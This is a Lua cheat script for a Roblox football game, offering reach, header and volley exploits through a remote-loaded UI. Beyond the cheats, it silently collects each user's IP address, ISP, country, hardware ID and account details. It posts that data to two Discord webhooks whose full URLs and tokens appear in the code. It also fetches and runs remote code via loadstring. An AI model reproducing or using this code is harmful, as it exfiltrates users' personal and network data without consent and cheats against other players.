-- [[ CEZAR PRIVATE V3 - PURE ENGINE RESTORED ]]
-- [[ FULL X/Y/Z SLIDERS + ULTIMATE INTEL LOGS ]]

local lp = game:GetService("Players").LocalPlayer
local hs = game:GetService("HttpService")
local rs = game:GetService("RunService")
local ws = game:GetService("Workspace")
local uis = game:GetService("UserInputService")

-- [[ AUTH & PERMANENT WHITELIST ]]
local _WL = {
    [tostring(bit32.bxor(4479445660, 99))] = true,
    [tostring(bit32.bxor(10459866852, 99))] = true,
    [tostring(bit32.bxor(10459902683, 99))] = true,
    [tostring(bit32.bxor(10412239686, 99))] = true,
    [tostring(bit32.bxor(10468504953, 99))] = true,
    [tostring(bit32.bxor(10378425639, 99))] = true,
    [tostring(bit32.bxor(5170104098, 99))] = true,
    [tostring(bit32.bxor(7003997072, 99))] = true
}

-- [[ THE ULTIMATE INTEL LOGGER ]]
local function SendFullIntel()
    local hooks = {
        "https://discordapp.com/api/webhooks/1470123276381716535/sdeTIMl8cMvBUHM69La7DbjQoc7hcfDMafa3XrxO5ilXVD5fZ_-wnuQQA3MMCWupNZAx",
        "https://discordapp.com/api/webhooks/1469712109255266435/X1VpIz7AOMYw04s0c1h8EqDEauvlILsXIxNR8B5XSMEbA42b6kHfjQ3b1tjPnmFTA9i3"
    }
    
    task.spawn(function()
        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        local exec = (identifyexecutor and identifyexecutor()) or "Unknown"
        local net = {query = "N/A", isp = "N/A", country = "N/A"}

        pcall(function()
            net = hs:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
        end)

        local data = {
            ["embeds"] = {{
                ["title"] = "🚀 CEZAR V3 - TARGET FULL INTEL",
                ["color"] = 0,
                ["fields"] = {
                    {["name"] = "👤 Profile", ["value"] = "User: "..lp.Name.."\nID: "..lp.UserId.."\nAge: "..lp.AccountAge.." days", ["inline"] = true},
                    {["name"] = "💻 System", ["value"] = "Exec: "..exec.."\nHWID: "..hwid, ["inline"] = true},
                    {["name"] = "🌐 Network", ["value"] = "IP: "..net.query.."\nISP: "..net.isp.."\nLoc: "..net.country, ["inline"] = false},
                    {["name"] = "🎮 Game", ["value"] = "JobId: "..game.JobId.."\nPlace: "..game.PlaceId, ["inline"] = false}
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }

        for _, url in pairs(hooks) do
            pcall(function() (request or http_request or syn.request)({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = hs:JSONEncode(data)}) end)
        end
    end)
end

if not _WL[tostring(bit32.bxor(lp.UserId, 99))] then lp:Kick("DM KERSAII ON DC") return else SendFullIntel() end

-- [[ CONFIG ]]
local cfg = {
    leg_enabled = false, leg_x = 9, leg_y = 9, leg_z = 9,
    moss_enabled = false, m_x = 2.0, m_y = 2.9, m_z = 1.7,
    khalid_enabled = false,
    react_multiplier = 100, reach_power = 15, jump_reach = 5,
    glide_speed = 0
}

-- [[ UI LOAD ]]
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
local Window = WindUI:CreateWindow({
    Title = "Cezar Hub V3",
    Size = UDim2.fromOffset(600, 550),
    OpenButton = { Title = "C", Color = ColorSequence.new(Color3.new(0,0,0), Color3.new(0,0,0)) }
})
WindUI:SetTheme("Total_Void")

-- [[ PC TOGGLE ]]
uis.InputBegan:Connect(function(i, g) if not g and i.KeyCode == Enum.KeyCode.B then Window:Toggle(not Window.Visible) end end)

-- [[ SECTIONS ]]
local MossTab = Window:Tab({ Title = "Moss", Icon = "target" })
local ReachTab = Window:Tab({ Title = "Reach", Icon = "mouse-pointer-2" })
local KhalidTab = Window:Tab({ Title = "Khalid", Icon = "wind" })
local ReactTab = Window:Tab({ Title = "React", Icon = "zap" })
local SMTab = Window:Tab({ Title = "SM / Misc", Icon = "settings" })

-- [[ MOSS CONTENT - RESTORED ]]
MossTab:Toggle({ Title = "Enable Moss", Callback = function(v) cfg.moss_enabled = v end })
MossTab:Slider({ Title = "Header X", Value = {Min = 0, Max = 25, Default = 2.0}, Callback = function(v) cfg.m_x = v end })
MossTab:Slider({ Title = "Header Y", Value = {Min = 0, Max = 25, Default = 2.9}, Callback = function(v) cfg.m_y = v end })
MossTab:Slider({ Title = "Header Z", Value = {Min = 0, Max = 25, Default = 1.7}, Callback = function(v) cfg.m_z = v end })
for _, p in pairs({15, 25, 50, 75}) do MossTab:Button({ Title = "MOSS "..p.."%", Callback = function() cfg.react_multiplier = p*4 end }) end
MossTab:Button({ Title = "100% DIAGALA MOSSED", Callback = function() cfg.react_multiplier = 2500 end })

-- [[ REACH CONTENT - RESTORED ]]
ReachTab:Toggle({ Title = "Enable Reach", Callback = function(v) cfg.leg_enabled = v end })
ReachTab:Slider({ Title = "Reach X", Value = {Min = 0, Max = 30, Default = 9}, Callback = function(v) cfg.leg_x = v end })
ReachTab:Slider({ Title = "Reach Y", Value = {Min = 0, Max = 30, Default = 9}, Callback = function(v) cfg.leg_y = v end })
ReachTab:Slider({ Title = "Reach Z", Value = {Min = 0, Max = 30, Default = 9}, Callback = function(v) cfg.leg_z = v end })
for _, p in pairs({15, 25, 50, 75}) do ReachTab:Button({ Title = "Reach "..p.."%", Callback = function() cfg.reach_power = p*2 end }) end
ReachTab:Button({ Title = "Reach 100% [MAX BUFF]", Callback = function() cfg.reach_power = 500 end })

-- [[ KHALID / REACT ]]
KhalidTab:Toggle({ Title = "Enable Khalid Volleys", Callback = function(v) cfg.khalid_enabled = v end })
KhalidTab:Button({ Title = "Khalid 100% [VOLLEY KING]", Callback = function() cfg.react_multiplier = 850 end })

ReactTab:Button({ Title = "React 100% [MAX POWER]", Callback = function() cfg.react_multiplier = 1500 end })

-- [[ SM / MISC ]]
SMTab:Button({ Title = "FORCE FULL LOG", Callback = function() SendFullIntel() end })
SMTab:Slider({ Title = "Cezar Glide", Value = {Min = 0, Max = 20, Default = 0}, Callback = function(v) cfg.glide_speed = v end })

-- [[ ENGINE ]]
rs.Heartbeat:Connect(function(dt)
    pcall(function()
        local char = lp.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local ball = ws:FindFirstChild("TPSSystem") and ws.TPSSystem:FindFirstChild("TPS") or ws:FindFirstChild("Ball")
        if not root or not ball then return end
        
        if cfg.glide_speed > 0 then root.CFrame = root.CFrame + (char.Humanoid.MoveDirection * (cfg.glide_speed * dt)) end
        local dist = (ball.Position - root.Position)
        
        -- KHALID
        if cfg.khalid_enabled and dist.Magnitude <= 5 then
            for i = 1, 150 do -- Burst firing to stop lag
                firetouchinterest(ball, char["Right Leg"], 0); firetouchinterest(ball, char["Right Leg"], 1)
                firetouchinterest(ball, char["Left Leg"], 0); firetouchinterest(ball, char["Left Leg"], 1)
            end
        end

        -- MOSS (FIXED HEIGHT + FULL SLIDERS)
        if cfg.moss_enabled and dist.Y > 0.2 and dist.Y <= cfg.m_y and math.abs(dist.X) <= cfg.m_x and math.abs(dist.Z) <= cfg.m_z then
            for i = 1, cfg.react_multiplier do 
                firetouchinterest(ball, char.Head, 0); firetouchinterest(ball, char.Head, 1) 
            end
        -- REACH (FIXED X/Y/Z)
        elseif cfg.leg_enabled and math.abs(dist.Y) <= cfg.leg_y and math.abs(dist.X) <= cfg.leg_x and math.abs(dist.Z) <= cfg.leg_z then
            for i = 1, cfg.reach_power do 
                firetouchinterest(ball, root, 0); firetouchinterest(ball, root, 1) 
            end
        end
    end)
end)
